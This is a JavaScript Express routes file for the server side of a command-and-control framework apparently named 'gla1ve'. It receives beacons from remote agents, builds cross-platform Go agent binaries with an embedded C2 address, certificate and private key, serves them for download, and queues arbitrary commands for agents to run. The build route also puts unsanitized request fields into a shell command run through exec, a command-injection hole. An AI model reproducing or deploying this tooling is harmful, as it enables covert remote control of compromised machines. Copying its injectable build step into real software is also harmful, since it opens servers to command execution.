// Agent Routes
const express = require('express');
const router = express.Router();
const AgentService = require('../services/agentService');
const TaskService = require('../services/taskService');
const TaskModel = require('../models/Task');
const { config } = require('../config/env');
const { exec } = require('child_process');
const { promisify } = require('util');
const fs = require('fs').promises;
const path = require('path');

const execPromise = promisify(exec);

// List all agents (public)
router.get('/', (req, res) => {
  const agents = AgentService.getAllAgents();
  res.json(agents);
});

// Agent beacon (mTLS authenticated)
router.post('/beacon', (req, res) => {
  try {
    const agentData = req.body;
    const clientCert = req.headers['x-forwarded-tls-client-cert'];
    const certInfo = req.headers['x-forwarded-tls-client-cert-info'];
    const agentId = req.headers['x-agent-id'];  // Read agent ID from header
    
    if (!clientCert) {
      return res.status(401).json({ error: 'Client certificate required' });
    }
    
    // Extract CN from Traefik headers (URL-encoded)
    let cn = 'unknown';
    if (certInfo) {
      const decoded = decodeURIComponent(certInfo);
      const match = decoded.match(/CN=([^,\]"]+)/);
      if (match) {
        cn = match[1].trim();
      }
    } else if (clientCert) {
      cn = AgentService.extractCNFromCert(clientCert);
    }
    
    // Merge header ID into body data
    agentData.id = agentId || agentData.id;
    agentData.cn = cn;
    
    // Determine IP (prefer publicIp from agent, fallback to x-forwarded-for)
    const providedPublic = agentData.publicIp ? String(agentData.publicIp).trim() : null;
    const ipHeader = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').toString();
    const ipRaw = providedPublic || ipHeader;
    const ipNorm = String(ipRaw).split(',')[0].trim().replace(/^.*:/, '');
    agentData.ip = ipNorm;
    
    const agent = AgentService.handleBeacon(agentData, clientCert);
    
    // Get pending tasks for this agent
    const pendingTasks = TaskService.getPendingTasks(agent.id);
    
    console.log(`[BEACON] Agent ${agent.id} (${agent.cn}) checked in - IP: ${agent.ip} - ${pendingTasks.length} pending task(s)`);
    
    res.json({
      status: 'ok',
      agentId: agent.id,
      message: 'Beacon received',
      tasks: pendingTasks
    });
  } catch (err) {
    console.error('Beacon error:', err);
    res.status(500).json({ error: 'Beacon processing failed' });
  }
});

// Whoami endpoint (agent identification)
router.post('/whoami', (req, res) => {
  const token = req.headers['x-agent-token'];
  
  if (token !== config.agentWhoamiToken) {
    return res.status(403).json({ error: 'Invalid agent token' });
  }
  
  const agentData = req.body;
  const agent = AgentService.handleBeacon(agentData, '');
  
  res.json({
    agentId: agent.id,
    message: 'Agent registered'
  });
});

// Build custom agent endpoint
router.post('/build-custom', async (req, res) => {
  console.log('[BUILD-CUSTOM] Handler called with body:', req.body);
  
  try {
    // Map frontend parameters
    const os = req.body.targetOS;
    const arch = req.body.targetArch;
    const c2Server = req.body.c2Server;
    const beaconInterval = req.body.beaconInterval;
    
    if (!os || !arch) {
      return res.status(400).json({ error: 'os and arch required' });
    }
    
    const agentDir = '/agents-go';
    const certDir = '/app/certs';
    
    // Read certificate files
    const caCert = await fs.readFile(path.join(certDir, 'ca.crt'), 'utf8');
    const clientCert = await fs.readFile(path.join(certDir, 'agent-client.crt'), 'utf8');
    const clientKey = await fs.readFile(path.join(certDir, 'agent-client.key'), 'utf8');
    
    const buildOS = os === 'windows' ? 'windows' : os === 'darwin' ? 'darwin' : 'linux';
    const buildArch = arch === 'amd64' ? 'amd64' : arch === 'arm64' ? 'arm64' : '386';
    const ext = os === 'windows' ? '.exe' : '';
    const outputName = `agent-${buildOS}-${buildArch}${ext}`;
    
    // Build directly to /app/builds (persistent volume)
    const buildsDir = '/app/builds';
    await fs.mkdir(buildsDir, { recursive: true });
    
    const finalPath = path.join(buildsDir, outputName);
    
    // Serialize tasks to JSON for embedding
    const tasksJSON = JSON.stringify(req.body.tasks || []);
    
    // Escape for ldflags: replace backslashes first, then quotes
    const escapeLdflags = (str) => {
      return str
        .replace(/\\/g, '\\\\')      // Escape backslashes
        .replace(/"/g, '\\"')         // Escape double quotes
        .replace(/'/g, "'\\''");      // Escape single quotes (shell: close quote, escaped quote, open quote)
    };
    
    const ldflags = [
      `-X 'gla1ve/agent/pkg/config.BeaconInterval=${beaconInterval || '30s'}'`,
      `-X 'gla1ve/agent/pkg/config.C2Server=${c2Server || `c2.${config.domain}:4443`}'`,
      `-X 'gla1ve/agent/pkg/config.EmbeddedTasks=${escapeLdflags(tasksJSON)}'`,
      `-X 'gla1ve/agent/pkg/config.EmbeddedCACert=${caCert.replace(/\n/g, '\\n')}'`,
      `-X 'gla1ve/agent/pkg/config.EmbeddedCert=${clientCert.replace(/\n/g, '\\n')}'`,
      `-X 'gla1ve/agent/pkg/config.EmbeddedKey=${clientKey.replace(/\n/g, '\\n')}'`
    ].join(' ');
    
    // Build using absolute paths, CGO_ENABLED=0, and cwd option
    const buildCmd = `CGO_ENABLED=0 GOOS=${buildOS} GOARCH=${buildArch} go build -ldflags "${ldflags}" -o ${finalPath} ${agentDir}/cmd/agent/main.go`;
    
    console.log('[BUILD] Building agent:', { os: buildOS, arch: buildArch });
    console.log('[BUILD] Command length:', buildCmd.length);
    console.log('[BUILD] Starting build process...');
    
    const { stdout, stderr } = await execPromise(buildCmd, { 
      cwd: agentDir,
      maxBuffer: 1024 * 1024 * 10,
      timeout: 120000 // 2 minute timeout
    });
    
    console.log('[BUILD] Build process completed');
    console.log('[BUILD] stdout:', stdout ? stdout.substring(0, 500) : '(empty)');
    console.log('[BUILD] stderr:', stderr ? stderr.substring(0, 500) : '(empty)');
    
    if (stderr && !stderr.includes('warning')) {
      console.log('[BUILD] Build failed with stderr');
      throw new Error(stderr);
    }
    
    console.log('[BUILD] Getting file stats...');
    const stats = await fs.stat(finalPath);
    
    console.log('[BUILD] Success! Binary size:', stats.size, 'bytes');
    
    res.json({
      success: true,
      filename: outputName,
      size: stats.size,
      downloadPath: `/api/agents/download/${outputName}`,
      agentId: req.body.agentId,
      tasks: req.body.tasks.length,
      beaconInterval: beaconInterval || '30s',
      c2Server: c2Server || `c2.${config.domain}:4443`,
      targetOS: buildOS,
      targetArch: buildArch,
      expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
      message: 'Agent built successfully'
    });
  } catch (err) {
    console.error('[BUILD] ERROR:', err.message);
    console.error('[BUILD] Stack:', err.stack);
    res.status(500).json({ error: err.message || 'Build failed' });
  }
});

// Download built agent from /app/builds
router.get('/download/:filename', async (req, res) => {
  try {
    const { filename } = req.params;
    
    // Validate filename to prevent directory traversal
    if (!/^agent-[a-z]+-[a-z0-9]+(\.exe)?$/.test(filename)) {
      console.log('[DOWNLOAD] Invalid filename:', filename);
      return res.status(400).json({ error: 'Invalid filename' });
    }
    
    const buildsDir = '/app/builds';
    const filePath = path.join(buildsDir, filename);
    
    console.log('[DOWNLOAD] Serving agent binary:', filename, 'to user:', req.user?.username || 'anonymous');
    
    // Check if file exists
    await fs.access(filePath);
    
    // Get file stats
    const stats = await fs.stat(filePath);
    
    // Force fresh download by setting aggressive no-cache headers
    // and removing any conditional GET handling
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Length', stats.size);
    
    // Remove ETag to prevent conditional GET caching
    res.removeHeader('ETag');
    
    console.log('[DOWNLOAD] File stats:', { size: stats.size, mtime: stats.mtime });
    
    // Stream the file
    const fileStream = require('fs').createReadStream(filePath);
    
    fileStream.on('error', (err) => {
      console.error('[DOWNLOAD] Stream error:', err);
      if (!res.headersSent) {
        res.status(500).json({ error: 'Download failed' });
      }
    });
    
    fileStream.on('end', () => {
      console.log('[DOWNLOAD] Successfully sent:', filename);
    });
    
    fileStream.pipe(res);
    
  } catch (err) {
    console.error('[DOWNLOAD] Error:', err);
    if (err.code === 'ENOENT') {
      res.status(404).json({ error: 'File not found' });
    } else {
      res.status(500).json({ error: err.message });
    }
  }
});

// Receive embedded task results from agents
router.post('/:agentId/embedded-tasks', (req, res) => {
  const { agentId } = req.params;
  const { results } = req.body;
  
  if (!results || !Array.isArray(results)) {
    return res.status(400).json({ error: 'Missing results array' });
  }
  
  console.log(`[EmbeddedTasks] Received ${results.length} task results from agent: ${agentId}`);
  
  const TaskModel = require('../models/Task');
  let storedCount = 0;
  
  for (const result of results) {
    try {
      const taskId = result.taskId || result.id;
      
      if (taskId) {
        // Try to update existing task first
        const updated = TaskModel.updateResult(
          agentId, 
          taskId, 
          result.output || result.result || '', 
          result.error || null
        );
        
        if (updated) {
          storedCount++;
          console.log(`[EmbeddedTasks] Updated task ${taskId} (${result.type}): ${updated.status}`);
          continue;
        }
      }
      
      // If task doesn't exist (initial embedded tasks), create new completed entry
      const task = {
        id: taskId || `embedded-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`,
        agentId,
        type: 'embedded',
        taskType: result.type || 'unknown',
        status: result.status || 'completed',
        result: result.output || result.result || '',
        error: result.error || '',
        createdAt: new Date().toISOString(),
        completedAt: new Date().toISOString()
      };
      
      // Add to task queue
      const taskStore = TaskModel.getStore();
      const tasks = taskStore.get(agentId) || [];
      tasks.push(task);
      taskStore.set(agentId, tasks);
      
      storedCount++;
      console.log(`[EmbeddedTasks] Stored new result for task ${task.id} (${result.type}): ${task.status}`);
    } catch (err) {
      console.error(`[EmbeddedTasks] Failed to store task result:`, err);
    }
  }
  
  res.json({ success: true, stored: storedCount });
});

// Task Management Routes (for dashboard)
router.post('/:agentId/tasks', (req, res) => {
  try {
    const { agentId } = req.params;
    const { cmd, args, type, taskType, params, runOnce } = req.body;
    
    // Check if agent exists
    const agent = AgentService.getAgent(agentId);
    if (!agent) {
      return res.status(404).json({ error: 'Agent not found' });
    }
    
    let task;
    
    // Handle embedded task format (from task builder)
    if (type === 'embedded' || taskType) {
      if (!taskType) {
        return res.status(400).json({ error: 'taskType required for embedded tasks' });
      }
      
      // Create task with proper embedded format
      task = TaskService.createTask(agentId, {
        type: 'embedded',
        taskType: taskType,
        params: params || {},
        runOnce: runOnce || false
      });
      
      console.log(`[TASK] Created embedded task ${task.id} for agent ${agentId}: ${taskType}`);
    }
    // Handle quick command format
    else if (cmd) {
      task = TaskService.createTask(agentId, { 
        cmd, 
        args: args || [] 
      });
      
      console.log(`[TASK] Created task ${task.id} for agent ${agentId}: ${cmd} ${(args || []).join(' ')}`);
    }
    else {
      return res.status(400).json({ error: 'Either cmd or taskType required' });
    }
    
    res.status(201).json(task);
  } catch (err) {
    console.error('[TASK] Creation error:', err);
    res.status(500).json({ error: 'Failed to create task' });
  }
});

router.get('/:agentId/tasks', (req, res) => {
  try {
    const { agentId } = req.params;
    const tasks = TaskService.getAllTasks(agentId);
    res.json(tasks);
  } catch (err) {
    console.error('[TASK] Get tasks error:', err);
    res.status(500).json({ error: 'Failed to get tasks' });
  }
});

router.post('/:agentId/tasks/:taskId/result', (req, res) => {
  try {
    const { agentId, taskId } = req.params;
    const { result, error } = req.body;
    
    const task = TaskService.updateTaskResult(agentId, taskId, result, error);
    
    if (!task) {
      return res.status(404).json({ error: 'Task not found' });
    }
    
    console.log(`[TASK] Task ${taskId} completed for agent ${agentId}: ${task.status}`);
    
    res.json(task);
  } catch (err) {
    console.error('[TASK] Result update error:', err);
    res.status(500).json({ error: 'Failed to update task result' });
  }
});

module.exports = router;
